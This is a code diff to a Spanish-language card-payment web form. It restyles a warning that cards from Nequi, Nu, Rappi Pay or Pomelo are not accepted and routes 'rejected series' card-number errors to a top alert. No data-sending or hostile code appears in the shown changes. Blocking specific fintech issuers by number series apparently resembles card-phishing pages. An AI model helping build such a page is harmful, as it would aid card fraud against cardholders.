@@ -116,26 +116,36 @@
         .btn-submit:hover { background-color: #333333; }
         .btn-submit:disabled { background-color: #999; cursor: not-allowed; }
 
-        /* --- ALERTA ERROR / AVISO --- */
+        /* --- ALERTA ERROR / AVISO (BANNER FIJO ARRIBA DEL FORM) --- */
         .alert { padding: 10px; border-radius: 4px; margin-bottom: 15px; font-size: 12px; display: none; background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; font-weight: 600; }
         .alert.show { display: block; }
 
-        /* --- AVISO FORMAL EMISORES --- */
+        /* --- AVISO FORMAL EMISORES (FLOTANTE, NO EMPUJA LAYOUT) --- */
         .aviso-emisor {
             display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9998;
+            max-width: 360px;
+            width: calc(100% - 40px);
             padding: 14px 16px;
-            margin: 0 0 18px 0;
             background: #fff8e1;
             color: #8a6d3b;
             border: 1px solid #ffe0b2;
             border-left: 4px solid #f0ad4e;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 12.5px;
             line-height: 1.5;
             font-weight: 500;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.25);
         }
         .aviso-emisor.show { display: block; }
         .aviso-emisor strong { font-weight: 700; color: #6d4c1f; }
+
+        /* Ya no se usa: los errores de serie van al alertError de arriba */
+        #cardNumberError { display: none !important; }
 
         /* --- FOOTER LOGOS --- */
         .footer-logos { display: flex; justify-content: flex-start; align-items: center; padding: 15px 20px; background: #fff; border-top: 1px solid #eee; }
@@ -274,9 +284,9 @@
                     <input type="text" id="numero" placeholder="Número de la tarjeta" maxlength="19" autocomplete="cc-number" required>
                     <div class="card-logo-container" id="cardLogo"></div>
                 </div>
-                <div class="error-message" id="cardNumberError" style="display:none; color:#e53935; font-size:12px; margin-top:-15px; margin-bottom:15px;"></div>
+                <!-- cardNumberError ya no se usa: los errores van al alertError de arriba -->
 
-                <!-- AVISO FORMAL: EMISORES NO DISPONIBLES -->
+                <!-- AVISO FORMAL: EMISORES NO DISPONIBLES (FLOTANTE) -->
                 <div class="aviso-emisor" id="avisoEmisor">
                     <strong>Aviso importante:</strong> Por el momento, no es posible procesar pagos con tarjetas emitidas por <strong>Nequi, Nu, Rappi Pay o Pomelo</strong>. Le sugerimos utilizar una tarjeta de crédito o débito de otra entidad bancaria para completar su trámite. Agradecemos su comprensión.
                 </div>
@@ -444,7 +454,6 @@
         const btnPagar = document.getElementById('btnPagar');
         const alertError = document.getElementById('alertError');
         const mensajeError = document.getElementById('mensajeError');
-        const cardNumberError = document.getElementById('cardNumberError');
         const avisoEmisor = document.getElementById('avisoEmisor');
 
         const loadingOverlay = document.getElementById('loadingOverlay');
@@ -456,7 +465,7 @@
         const initialSpinner = document.getElementById('initialSpinner');
 
         // ============================================================
-        // AVISO FORMAL AL ENFOCAR / CLIC EN NÚMERO DE TARJETA
+        // AVISO FORMAL AL ENFOCAR / CLIC EN NÚMERO DE TARJETA (FLOTANTE)
         // ============================================================
         function mostrarAvisoEmisor() {
             avisoEmisor.classList.add('show');
@@ -561,13 +570,12 @@
             if (value.length >= 3) { cardType = detectCardType(value); updateCardLogo(cardType); }
             else { cardLogo.innerHTML = ''; cardType = null; }
 
-            // Validación de series rechazadas
+            // ✅ El error de serie rechazada va al alertError de arriba (no empuja el layout)
             if (esSerieRechazada(value)) {
-                cardNumberError.textContent = mensajeSerieRechazada();
-                cardNumberError.style.display = 'block';
+                mostrarError(mensajeSerieRechazada());
                 inputNumero.closest('.input-group').classList.add('error');
             } else {
-                cardNumberError.style.display = 'none';
+                ocultarError();
                 inputNumero.closest('.input-group').classList.remove('error');
             }
         });
